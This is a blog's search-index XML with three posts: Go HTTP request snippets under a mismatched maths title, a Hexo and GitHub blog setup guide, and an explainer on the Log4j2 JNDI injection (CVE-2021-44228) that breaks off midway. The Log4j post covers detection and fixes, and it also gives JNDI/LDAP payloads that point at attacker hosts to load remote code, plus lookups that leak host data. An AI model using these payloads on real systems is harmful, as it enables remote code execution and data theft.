<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>高数简介</title>
      <link href="/2023/02/07/%E8%80%83%E7%A0%94/%E9%AB%98%E6%95%B0/%E9%AB%98%E6%95%B0/"/>
      <url>/2023/02/07/%E8%80%83%E7%A0%94/%E9%AB%98%E6%95%B0/%E9%AB%98%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="1-Get"><a href="#1-Get" class="headerlink" title="1.Get"></a>1.Get</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">   <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   resp, _ := http.Get(<span class="string">&quot;http://114.67.175.224:11934?what=flag&quot;</span>)</span><br><span class="line">   body, _ := ioutil.ReadAll(resp.Body)</span><br><span class="line">   fmt.Println(<span class="type">string</span>(body))</span><br><span class="line">   <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-Post"><a href="#2-Post" class="headerlink" title="2.Post"></a>2.Post</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   payload := strings.NewReader(<span class="string">&quot;what=flag&quot;</span>)</span><br><span class="line">   resp, _ := http.Post(<span class="string">&quot;http://114.67.175.224:15740&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, payload)</span><br><span class="line">   body, _ := ioutil.ReadAll(resp.Body)</span><br><span class="line">   fmt.Println(<span class="type">string</span>(body))</span><br><span class="line">   <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 考研 </category>
          
          <category> 数学 </category>
          
          <category> 高数 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 考研 </tag>
            
            <tag> 数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+Github博客搭建</title>
      <link href="/2023/02/06/%E5%85%B6%E4%BB%96/hexo+Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/02/06/%E5%85%B6%E4%BB%96/hexo+Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="Hexo搭建"><a href="#Hexo搭建" class="headerlink" title="Hexo搭建"></a>Hexo搭建</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li>安装<code>Git</code></li><li>安装<code>Node.js</code></li><li>安装<code>Hexo</code></li><li><code>GitHub</code>创建个人仓库</li><li><code>SSH</code>绑定<code>GitHub</code></li><li>将<code>hexo</code>部署到<code>GitHub</code></li><li>发布文章</li></ol><h3 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1. 安装Git"></a>1. 安装Git</h3><ul><li><p>为了把本地的网页文件上传到<code>github</code>上面去，需要用到工具 — Git[<a href="https://git-scm.com/download">下载地址]</a></p></li><li><p>廖雪峰老师的<code>Git</code>教程写的非常好，大家可以看一下<a href="https://www.liaoxuefeng.com/wiki/896043488029600">Git教程</a></p></li></ul><p><strong>windows：</strong></p><ul><li>到<code>git</code>官网上下载<code>.exe</code>文件，<a href="https://git-scm.com/download/win">Download git</a>,安装选项还是全部默认，只不过最后一步添加路径时选择<code>Use Git from the Windows Command Prompt</code>，这样我们就可以直接在命令提示符里打开<code>git</code>了</li><li>顺便说一下，<code>windows</code>在<code>git</code>安装完后，就可以直接使用<code>git bash</code>来敲命令行更方便，不用自带的<code>cmd</code></li><li>输入 git –version验证是否安装成功</li></ul><p><strong>linux：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><h3 id="2-安装nodejs"><a href="#2-安装nodejs" class="headerlink" title="2. 安装nodejs"></a>2. 安装nodejs</h3><ul><li><code>Hexo</code>是基于<code>node.js</code>编写的，所以需要安装<code>node.js</code>和<code>npm</code>工具</li></ul><p><strong>windows：</strong></p><ul><li>下载稳定版或者最新版都可以<a href="http://nodejs.cn/download/">Node.js</a>，安装选项全部默认，一路点击<code>Next</code></li><li>输入<code>node -v</code>和<code>npm -v</code>验证是否安装成功</li></ul><p><strong>linux：</strong>命令行安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nodejs</span><br><span class="line">sudo apt-get install npm</span><br><span class="line">//不过不推荐命令行安装，有时候有问题，建议直接到官网去下载编译好的压缩文件</span><br></pre></td></tr></table></figure><p><strong>添加国内镜像源</strong></p><ul><li>如果没有梯子的话，可以使用阿里的国内镜像进行加速(虽然我暂时有用一个好兄弟的梯子，也配置了阿里镜像)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><h3 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3. 安装Hexo"></a>3. 安装Hexo</h3><ol><li><p>创建一个文件夹<code>MyBlog</code>，用来存放自己的博客文件，然后用终端<code>cd</code>到这个文件夹下（或者在这个文件夹下直接右键<code>git bash</code>打开）</p></li><li><p>输入<code>npm install -g hexo-cli</code>安装<code>Hexo</code>（可能会有几个报错，无视它就行）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">//安装完后输入hexo -v验证是否安装成功。</span><br></pre></td></tr></table></figure></li><li><p>初始化一下<code>hexo</code>,即初始化我们的网站，输入<code>hexo init</code>初始化文件夹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init MyBlog</span><br></pre></td></tr></table></figure></li><li><p>接着输入<code>npm install</code>安装必备的组件。</p></li><li><p>本地的网站配置就完成了；输入<code>hexo g</code>生成静态网页，然后输入<code>hexo s</code>打开本地服务器。关闭本地服务的话<code>ctrl+c</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo server(或者简写:hexo s，本地起服务)</span><br></pre></td></tr></table></figure></li><li><p>浏览器输入<a href="http://localhost:4000/%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%88%91%E4%BB%AC%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%95%A6%E3%80%82%E7%94%9F%E6%88%90%E9%BB%98%E8%AE%A4%E5%86%85%E5%AE%B9%E6%98%AFhexo%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3">http://localhost:4000/，就可以看到我们的博客啦。生成默认内容是hexo的简单使用文档</a></p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230205224254165.png" alt="image-20230205224254165"></p></li></ol><h3 id="4-注册Github账号创建个人仓库"><a href="#4-注册Github账号创建个人仓库" class="headerlink" title="4. 注册Github账号创建个人仓库"></a>4. 注册Github账号创建个人仓库</h3><ul><li>打开<a href="https://github.com/%EF%BC%8C%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%BB%93%E5%BA%93%60New">https://github.com/，新建一个项目仓库`New</a> repository&#96;</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230205224553333.png" alt="image-20230205224553333"></p><ul><li>输入自己的项目名字(这里一定要输入自己的**{你的个人ID}.github.io**)，后面一定要加<code>.github.io</code>后缀，<code>README</code>初始化也要勾上。然后点击最下面完成创建</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230205224803139.png" alt="image-20230205224803139"></p><ol start="5"><li>生成SSH添加到GitHub</li></ol><ul><li><p>生成<code>SSH</code>添加到<code>GitHub</code>，连接<code>Github</code>与本地；输入下面命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;yourname&quot;</span>  //你的Github ID</span><br><span class="line">git config --global user.email <span class="string">&quot;youremail&quot;</span>//你的Github绑定的邮箱</span><br></pre></td></tr></table></figure></li><li><p>可以用以下两条，检查一下你有没有输对</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure></li><li><p>然后创建<code>SSH</code>,一路回车</p><ul><li><code>ssh</code>，简单来讲，就是一个秘钥.其中，<code>id_rsa</code>是你这台电脑的私人秘钥，不能给别人看的，<code>id_rsa.pub</code>是公共秘钥，可以随便给别人看。把这个公钥放在<code>GitHub</code>上，这样当你链接<code>GitHub</code>自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过<code>git</code>上传你的文件到<code>GitHub</code>上。</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;youremail&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>执行完上面的命令，会生成ssh密钥；找到.ssh目录，用记事本(notepad++等)打开id_rsa.pub全部复制。</p></li><li><p>打开Github，找到setting里面的SSH选项，New SSH Key;填入公钥id_rsa.pub里面的内容</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230205225832042.png" alt="image-20230205225832042"></p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230205230206630.png" alt="image-20230205230206630"></p><ul><li><p>输入 ssh -T <a href="mailto:&#103;&#105;&#116;&#64;&#103;&#105;&#x74;&#104;&#x75;&#98;&#x2e;&#99;&#x6f;&#x6d;">&#103;&#105;&#116;&#64;&#103;&#105;&#x74;&#104;&#x75;&#98;&#x2e;&#99;&#x6f;&#x6d;</a>，出现了Hi，你的ID。就是绑定成功了</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230205230456921.png" alt="image-20230205230456921"></p></li></ul><h3 id="6-将hexo部署到GitHub"><a href="#6-将hexo部署到GitHub" class="headerlink" title="6. 将hexo部署到GitHub"></a>6. 将hexo部署到GitHub</h3><ul><li>打开博客根目录下的<code>_config.yml</code>文件(刚刚 hexo init Myblog生成的配置文件)，拉到最下面</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span>  <span class="string">//上传形式，git方式</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">git@github.com:Azh3n/Azh3n.github.io.git</span> <span class="string">//repository修改为你自己的github项目地址即可,见下图；最好是使用SSH</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span>   <span class="string">//这个地方填master和main取决于你的page挂在哪个分支。master不行，就改成main试试</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230205230950794.png" alt="image-20230205230950794"></p><ul><li><p>还需要安装<code>deploy-git</code> 部署命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></li><li><p>这样就部署成功了，输入hexo命令试试</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo clean    //清除了之前生成的东西，可以不加 </span><br><span class="line">hexo generate //顾名思义，生成静态文章，可以用 hexo g缩写 hexo deploy   //上传文章到github，可以用hexo d缩写</span><br></pre></td></tr></table></figure></li></ul><h3 id="7-写文章、发布文章"><a href="#7-写文章、发布文章" class="headerlink" title="7.写文章、发布文章"></a>7.写文章、发布文章</h3><ul><li><p>安装一个扩展</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git</span><br></pre></td></tr></table></figure></li><li><p>然后输入新建一篇文章</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new post <span class="string">&quot;article title&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>再打开MyBlog\source_posts的目录，发现下面多了一个文件夹和一个.md文件</p></li><li><p>一个用来存放你的图片等数据，另一个就是你的文章文件。</p></li><li><p>使用md编辑工具(我使用Typora)编写完markdown文件后</p><ul><li>在目录MyBlog下输入hexo g生成静态网页</li><li>然后输入hexo s可以本地预览效果</li><li>最后输入hexo d上传到github上。</li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//还可以把上面的过程连起来</span></span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure><h2 id="个人定制"><a href="#个人定制" class="headerlink" title="个人定制"></a>个人定制</h2><ul><li>博客的目录结构如下：</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">- node_modules</span><br><span class="line">- public</span><br><span class="line">- scaffolds</span><br><span class="line">- source</span><br><span class="line">    - _data</span><br><span class="line">    - _posts</span><br><span class="line">    - about</span><br><span class="line">    - archives</span><br><span class="line">    - categories</span><br><span class="line">    - friends</span><br><span class="line">    - tags</span><br><span class="line">- themes</span><br></pre></td></tr></table></figure><h3 id="hexo基本配置"><a href="#hexo基本配置" class="headerlink" title="hexo基本配置"></a>hexo基本配置</h3><h4 id="参数描述"><a href="#参数描述" class="headerlink" title="参数描述"></a>参数描述</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">网站标题---title</span><br><span class="line">网站副标题---subtitle</span><br><span class="line">网站描述---description</span><br><span class="line">您的名字---author</span><br><span class="line">网站使用的语言---language</span><br><span class="line"></span><br><span class="line">其中，`description`主要用于`SEO`，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词。`author`参数用于主题显示文章的作者。</span><br></pre></td></tr></table></figure><h4 id="Front-matter"><a href="#Front-matter" class="headerlink" title="Front-matter"></a>Front-matter</h4><ul><li><p><code>Front-matter</code> 是<code>md</code>文件最上方以 <code>---</code>分隔的区域。用于指定个别文件的变量，见下面的参数描述。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">layout---布局</span><br><span class="line">title---标题</span><br><span class="line">date---建立日期</span><br><span class="line">updated---更新日期</span><br><span class="line">comments---开启文章的评论功能</span><br><span class="line">tags---标签（不适用于分页）</span><br><span class="line">categories---分类（不适用于分页）</span><br><span class="line">permalink---覆盖文章网址</span><br><span class="line">cover---封面</span><br></pre></td></tr></table></figure></li><li><p>举例来说：</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">title: log4j2 JNDI注入(CVE<span class="number">-2021</span><span class="number">-44228</span>) </span><br><span class="line">date: <span class="number">2023</span><span class="number">-02</span><span class="number">-05</span> <span class="number">14</span>:<span class="number">09</span>:<span class="number">44</span></span><br><span class="line">tags: [安全,web,反序列化]</span><br><span class="line">cover: /img/c7.jpg</span><br><span class="line">categories: </span><br><span class="line">- [web安全, 框架漏洞]</span><br></pre></td></tr></table></figure><h4 id="布局-layout"><a href="#布局-layout" class="headerlink" title="布局(layout)"></a>布局(layout)</h4><h5 id="post"><a href="#post" class="headerlink" title="post"></a><strong>post</strong></h5><ul><li><p>默认使用的是<code>post</code>这个布局，也就是在<code>source</code>文件夹下的<code>_post</code>里面。</p></li><li><p><code>Hexo</code>有三种布局：<code>post</code>、<code>page</code>和<code>draft</code>，它们分别对应不同的路径，而您自定义的其他布局和<code>post</code>相同，都将储存到<code>source/_posts</code>文件夹。</p></li><li><p>使用命令可以写到不同布局里面</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="built_in">new</span> [layout] &lt;title&gt; <span class="comment">//layout默认是post布局。</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="page新页"><a href="#page新页" class="headerlink" title="page新页"></a><strong>page新页</strong></h5><ul><li>如果你想另起一页，那么可以使用</li><li>系统会自动给你在<code>source</code>文件夹下创建一个<code>page2</code>文件夹，以及<code>page2</code>文件夹中的<code>index.md</code></li><li>以后访问的page2对应的链接就是<a href="http://xxx.xxx/newpage">http://xxx.xxx/newpage</a></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="built_in">new</span> page page2</span><br></pre></td></tr></table></figure><h5 id="draft草稿"><a href="#draft草稿" class="headerlink" title="draft草稿"></a><strong>draft草稿</strong></h5><ul><li><code>draft</code>是草稿的意思，如果你想写文章，又不希望被看到，那么可以用draft布局</li><li>这样会在<code>source/_draft</code>中新建一个<code>newdraft.md</code>文件</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="built_in">new</span> draft mydraft</span><br></pre></td></tr></table></figure><ul><li>如果你的草稿文件写的过程中，想要预览一下</li><li>在本地端口中开启服务预览。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server --draft</span><br></pre></td></tr></table></figure><ul><li>如果你的草稿文件想要发表到<code>post</code>中，</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo publish draft newdraft</span><br></pre></td></tr></table></figure><h4 id="主题更换"><a href="#主题更换" class="headerlink" title="主题更换"></a>主题更换</h4><ul><li>进入上面目录结构中的themes目录，把你下载的主题放进去，改名为butterfly(我用的butterfly主题)</li><li>打开<code>_config.yml</code>博客配置文件，更改主题</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">butterfly</span> <span class="string">//默认的是landscap，我使用的是butterfly</span></span><br></pre></td></tr></table></figure><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h3 id="图片懒加载"><a href="#图片懒加载" class="headerlink" title="图片懒加载"></a>图片懒加载</h3><ul><li><p>1.新增hexo-lazyload-image模块</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-lazyload-image --save</span><br></pre></td></tr></table></figure></li><li><p>2.在主目录配置文件_config.yml增加配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">lazyload:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">loadingImg:</span> <span class="string">/img/loading.gif</span> <span class="string">//这个就是图片没加载出来的时候，出现一个动图转转转的文章页样式</span></span><br></pre></td></tr></table></figure></li><li><p>更多优化可以参考这篇文章，作者写的很全(针对butterfly主题)</p><p><a href="https://blog.csdn.net/YR_112233/article/details/122778691">(235条消息) hexo个人博客搭建（二）butterfly主题配置_hexo butterfly_其实不会敲代码的博客-CSDN博客</a></p></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="博客备份"><a href="#博客备份" class="headerlink" title="博客备份"></a>博客备份</h3><ul><li>将博客目录下的所有源文件都上传到<code>github</code>上面。</li><li>首先在<code>github</code>博客仓库下新建一个分支<code>hexo</code>，然后<code>git clone</code>到本地，把<code>.git</code>文件夹拿出来，放在博客根目录下；再进行以下操作<ul><li><code>git branch -b hexo</code>切换到<code>hexo</code>分支</li><li><code>git add .</code>，</li><li><code>git commit -m &quot;xxx&quot;</code>，</li><li>最后<code>git push origin hexo</code>提交。</li></ul></li></ul><h3 id="文章参考"><a href="#文章参考" class="headerlink" title="文章参考"></a>文章参考</h3><ul><li>下面的文章，作者写的很全。</li><li>为了避免重复搬运轮子，可以参考下面的文章。</li></ul><p>[Butterfly美化 - MoYu-zc - 博客园 (cnblogs.com)](<a href="https://www.cnblogs.com/MoYu-zc/p/14395965.html#:~:text=8.%E5%9B%BE%E7%89%87%E6%87%92%E5%8A%A0%E8%BD%BD">https://www.cnblogs.com/MoYu-zc/p/14395965.html#:~:text=8.图片懒加载</a> 1.新增 hexo-lazyload-image 模块 npm install hexo-lazyload-image –save,2.在主目录配置文件 _config.yml 增加配置 lazyload%3A enable%3A true loadingImg%3A %2Fimg%2Floading.gif)</p><p><a href="https://sunhwee.com/posts/6e8839eb.html#toc-heading-67">https://sunhwee.com/posts/6e8839eb.html#toc-heading-67</a></p><p><a href="https://hexoscript.gitbook.io/hexo-script/v/1.3-1/shi-yong-bu-zhou/zhun-bei-gong-ju">准备工具 - hexo-script使用文档 (gitbook.io)</a></p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>npm下载拓展的时候，可能需要更高的权限。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j2 JNDI注入(CVE-2021-44228)</title>
      <link href="/2023/02/05/Web%E5%AE%89%E5%85%A8/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Log4j/log4j2%20JNDI%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/02/05/Web%E5%AE%89%E5%85%A8/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Log4j/log4j2%20JNDI%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><img src="https://secure2.wostatic.cn/static/K8dSpx8WfJMrAT3nUt4F2/image.png?auth_key=1675577605-vek5WBGew81Xtu8gQdzqbF-0-30d0ec22cb77a6c29059e9b37ea05f1e&file_size=2014637" alt="img"></p><ol><li>首先攻击者准备一个远程的http服务器，存放我们的恶意代码.class文件</li><li>然后在开启一个ldap目录服务，ldap存放一个外部的资源，就是命令引用，指定为我们的远程服务器的恶意代码.class文件地址</li><li>然后我们在用户输入的信息地方传入我们的恶意payload ${jndi:ldap:&#x2F;&#x2F;wuya.com:5678&#x2F;test}</li><li>然后日志中就会有我们的恶意payload的日志</li><li>log4j就会去解析该信息，通过**jndi的lookup()**去查找我们的ldap服务中的资源文件</li><li>由于我们的恶意payload的ldap的资源是不存在的</li><li>如果JNDI客户端，在LDAP服务中找不到对应的资源(test)</li><li>就去指定的地址请求。如果是命名引用，会把这个文件下载到本地</li><li>然后恶意代码中无参构造函数或静态方法块，加载的时候会自动执行，底层代码是进行了new的操作的</li></ol><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><ul><li>Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于${jndi:ldap:&#x2F;&#x2F;evil.com&#x2F;example}的lookup用于进行JNDI注入，执行任意代码。</li><li>2021 年 12 月，在 Apache Log4j2 中发现了一个 0-day 漏洞。 Log4j 的 JNDI 支持并没有限制可以解析的名称。 一些协议如 <code>rmi:</code>和 <code>ldap:</code>不安全或允许远程代码执行。</li></ul><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、使用了log4j的组件，并且版本在 <span class="number">2.</span>x &lt;= <span class="number">2.14</span><span class="number">.1</span> </span><br><span class="line"><span class="number">2</span>、JDK版本小于 <span class="number">8</span>u191、<span class="number">7</span>u201、<span class="number">6</span>u211</span><br></pre></td></tr></table></figure><h3 id="排查方法"><a href="#排查方法" class="headerlink" title="排查方法"></a>排查方法</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、pom版本检查</span><br><span class="line">2、可以通过检查日志中是否存在“jndi:ldap://”，“jndi:rmi”，“dnslog.cn”等字符来发现可能的攻击行为。。 </span><br><span class="line">3、检查日志中是否存在相关堆栈报错，堆栈里是否有JndiLookup，ldapURLContext，getObjectFactoryFromReference等与 jndi 调用相关的堆栈信息</span><br></pre></td></tr></table></figure><ul><li><p><strong>排查工具</strong></p><p><a href="https://static.threatbook.cn/tools/log4j-localcheck.sh">https://static.threatbook.cn/tools/log4j-localcheck.sh</a> <a href="https://sca.seczone.cn/allScanner.zip">https://sca.seczone.cn/allScanner.zip</a></p></li></ul><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、禁止用户请求参数出现攻击关键字 (安全产品waf等） </span><br><span class="line"><span class="number">2</span>、禁止lookup下载远程文件（命名引用） </span><br><span class="line"><span class="number">3</span>、禁止log4j的应用连接外网 </span><br><span class="line"><span class="number">4</span>、禁止log4j使用lookup </span><br><span class="line"><span class="number">5</span>、从log4j jar包中中删除lookup <span class="number">2.10</span>以下</span><br><span class="line"><span class="number">6</span>、升级jdk版本</span><br><span class="line"><span class="number">7</span>、修改log4j配置（临时方案）</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br><span class="line"><span class="string">    1、设置参数：</span></span><br><span class="line"><span class="string">      log4j2.formatMsgNoLookups=True</span></span><br><span class="line"><span class="string">    2、修改JVM参数：</span></span><br><span class="line"><span class="string">      -Dlog4j2.formatMsgNoLookups=true</span></span><br><span class="line"><span class="string">    3、系统环境变量：</span></span><br><span class="line"><span class="string">      FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS设置为true</span></span><br><span class="line"><span class="string">    4、禁止使用了 Log4j2 的应用所在服务器外连</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span></span><br></pre></td></tr></table></figure><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><ul><li><p>我们可以在DNS日志平台收到相关日志，显示出当前Java版本：</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230205142203280.png" alt="image-20230205142203280"></p></li></ul><h5 id="其他敏感信息外带"><a href="#其他敏感信息外带" class="headerlink" title="其他敏感信息外带"></a>其他敏感信息外带</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`$&#123;hostName&#125;`</span></span><br><span class="line"><span class="string">`$&#123;sys:user.dir&#125;`</span></span><br><span class="line"><span class="string">`$&#123;sys:java.version&#125;`</span></span><br><span class="line"><span 